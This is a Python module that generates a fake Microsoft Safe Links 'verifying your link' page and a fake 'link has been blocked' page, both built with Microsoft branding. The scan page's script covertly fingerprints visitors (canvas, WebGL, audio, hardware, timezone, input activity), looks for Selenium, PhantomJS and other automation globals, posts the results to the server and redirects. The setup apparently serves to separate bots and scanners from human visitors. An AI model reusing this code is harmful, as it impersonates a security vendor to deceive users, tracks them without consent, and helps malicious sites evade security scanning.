"""Decoy scan page and advanced JS fingerprint collector.

The scan page mimics a legitimate link-protection interstitial (e.g. Microsoft
Safe Links). While the visitor sees a spinner, client-side JavaScript collects
a rich set of browser signals and POSTs them back before redirecting. This
gives the detection engine far more to work with than headers alone.
"""

from __future__ import annotations


def scan_page_html(brand: str = "Microsoft") -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{brand} Link Protection</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      background: #f3f3f3;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #323130;
    }}
    .card {{
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.08);
      padding: 48px 36px;
      text-align: center;
      max-width: 440px;
      width: 92%;
    }}
    .logo {{ width: 108px; height: auto; margin-bottom: 24px }}
    h1 {{ font-size: 20px; font-weight: 600; margin-bottom: 8px }}
    p {{ font-size: 14px; color: #605e5c; line-height: 1.5 }}
    .ring {{
      margin: 28px auto 12px;
      width: 36px; height: 36px;
      border: 3px solid #edebe9;
      border-top-color: #0078d4;
      border-radius: 50%;
      animation: spin .9s linear infinite;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg) }} }}
    .foot {{ margin-top: 28px; font-size: 11px; color: #a19f9d }}
  </style>
</head>
<body>
  <div class="card">
    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
      <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
      <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
      <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
      <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
    </svg>
    <h1>Verifying your link&hellip;</h1>
    <p>This link is being scanned to ensure it is safe.<br>Please wait a moment.</p>
    <div class="ring"></div>
    <div class="foot">{brand} Safe Links&trade; Protection</div>
  </div>

  <script>
  (function() {{
    "use strict";
    var t0 = Date.now();
    var m = {{
      windowSize: [window.innerWidth, window.innerHeight],
      windowOuter: [window.outerWidth, window.outerHeight],
      screenSize: [screen.width, screen.height],
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      webdriver: (navigator.webdriver === true),
      mouseMoves: 0,
      touchEvents: 0,
      hasTouchEvents: false,
      keyEvents: 0,
      scrollEvents: 0,
      pluginCount: navigator.plugins ? navigator.plugins.length : -1,
      languageCount: navigator.languages ? navigator.languages.length : 0,
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || "unset",
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      platform: navigator.platform || "",
      vendor: navigator.vendor || "",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      timezoneOffset: new Date().getTimezoneOffset(),
      canvasHash: null,
      canvasBlocked: false,
      webglRenderer: null,
      webglVendor: null,
      audioFingerprint: null,
      audioBlocked: false,
      automationAPIs: false,
      notificationPermission: typeof Notification !== "undefined" ? Notification.permission : "unsupported",
      connectionType: null,
      rafDelta: null,
      performanceTiming: null,
      touchSupport: ("ontouchstart" in window) || (navigator.maxTouchPoints > 0),
      pdfViewerEnabled: navigator.pdfViewerEnabled || false,
      deviceMemory: navigator.deviceMemory || null,
      reducedMotion: window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches,
      darkMode: window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches,
      elapsed: 0
    }};

    document.addEventListener("mousemove", function() {{ m.mouseMoves++ }});
    document.addEventListener("touchstart", function() {{
      m.touchEvents++;
      m.hasTouchEvents = true;
    }});
    document.addEventListener("keydown", function() {{ m.keyEvents++ }});
    document.addEventListener("scroll", function() {{ m.scrollEvents++ }});

    /* Canvas fingerprint */
    try {{
      var c = document.createElement("canvas");
      c.width = 200; c.height = 50;
      var ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(50, 0, 100, 50);
      ctx.fillStyle = "#069";
      ctx.fillText("BPP:canvas:fp", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("BPP:canvas:fp", 4, 17);
      var d = c.toDataURL();
      if (d && d.length > 100) {{
        var h = 0;
        for (var i = 0; i < d.length; i++) {{
          h = ((h << 5) - h + d.charCodeAt(i)) | 0;
        }}
        m.canvasHash = h.toString(16);
      }} else {{
        m.canvasBlocked = true;
      }}
    }} catch(e) {{ m.canvasBlocked = true }}

    /* WebGL renderer */
    try {{
      var gl = document.createElement("canvas").getContext("webgl")
           || document.createElement("canvas").getContext("experimental-webgl");
      if (gl) {{
        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
        if (dbg) {{
          m.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          m.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        }}
      }}
    }} catch(e) {{}}

    /* AudioContext fingerprint */
    try {{
      var actx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = actx.createOscillator();
      var an = actx.createAnalyser();
      var gain = actx.createGain();
      var proc = actx.createScriptProcessor(4096, 1, 1);
      gain.gain.value = 0;
      osc.type = "triangle";
      osc.connect(an);
      an.connect(proc);
      proc.connect(gain);
      gain.connect(actx.destination);
      osc.start(0);
      proc.onaudioprocess = function(evt) {{
        var buf = new Float32Array(an.frequencyBinCount);
        an.getFloatFrequencyData(buf);
        var sum = 0;
        for (var j = 0; j < buf.length; j++) sum += Math.abs(buf[j]);
        m.audioFingerprint = sum.toFixed(2);
        proc.disconnect();
        osc.stop();
        actx.close();
      }};
      setTimeout(function() {{
        try {{ proc.disconnect(); osc.stop(); actx.close() }} catch(e){{}}
      }}, 1500);
    }} catch(e) {{ m.audioBlocked = true }}

    /* Automation API detection */
    try {{
      if (window.__nightmare || window._phantom || window.callPhantom ||
          window.__selenium_unwrapped || window.__webdriver_evaluate ||
          window.__driver_evaluate || window.__webdriver_script_fn ||
          window.__webdriver_script_func || window.__lastWatirAlert ||
          window.__lastWatirConfirm || window.__lastWatirPrompt ||
          document.__selenium_unwrapped || document.__webdriver_evaluate ||
          window.domAutomation || window.domAutomationController ||
          navigator.webdriver) {{
        m.automationAPIs = true;
      }}
    }} catch(e) {{}}

    /* Connection type */
    try {{
      if (navigator.connection) {{
        m.connectionType = navigator.connection.effectiveType || navigator.connection.type || null;
      }}
    }} catch(e) {{}}

    /* requestAnimationFrame timing */
    try {{
      var rafStart = performance.now();
      requestAnimationFrame(function() {{
        m.rafDelta = Math.round(performance.now() - rafStart);
      }});
    }} catch(e) {{}}

    /* Performance timing */
    try {{
      if (performance.timing) {{
        var pt = performance.timing;
        m.performanceTiming = {{
          domContentLoaded: pt.domContentLoadedEventEnd - pt.navigationStart,
          loadComplete: pt.loadEventEnd - pt.navigationStart,
          dns: pt.domainLookupEnd - pt.domainLookupStart,
          connect: pt.connectEnd - pt.connectStart,
          ttfb: pt.responseStart - pt.navigationStart
        }};
      }}
    }} catch(e) {{}}

    function send() {{
      m.elapsed = Date.now() - t0;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "/api/v2/metrics/collect", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.onload = function() {{
        window.location.href = "/evergreen-assets/safelinks/1/atp-safelinks.html";
      }};
      xhr.onerror = function() {{
        window.location.href = "/evergreen-assets/safelinks/1/atp-safelinks.html";
      }};
      xhr.send(JSON.stringify(m));
    }}

    setTimeout(send, 3500);
  }})();
  </script>
</body>
</html>"""


def blocked_page_html(brand: str = "Microsoft") -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{brand} Link Protection</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f3f3f3;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }}
    .card {{
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.08);
      padding: 48px 36px;
      text-align: center;
      max-width: 440px;
      width: 92%;
    }}
    h1 {{ font-size: 20px; color: #a80000; margin-bottom: 12px }}
    p {{ font-size: 14px; color: #605e5c; line-height: 1.5 }}
    .foot {{ margin-top: 28px; font-size: 11px; color: #a19f9d }}
  </style>
</head>
<body>
  <div class="card">
    <h1>This link has been blocked</h1>
    <p>{brand} Safe Links has determined that this URL may be unsafe.<br>
    The page has not been loaded.</p>
    <div class="foot">{brand} Defender for Office 365</div>
  </div>
</body>
</html>"""
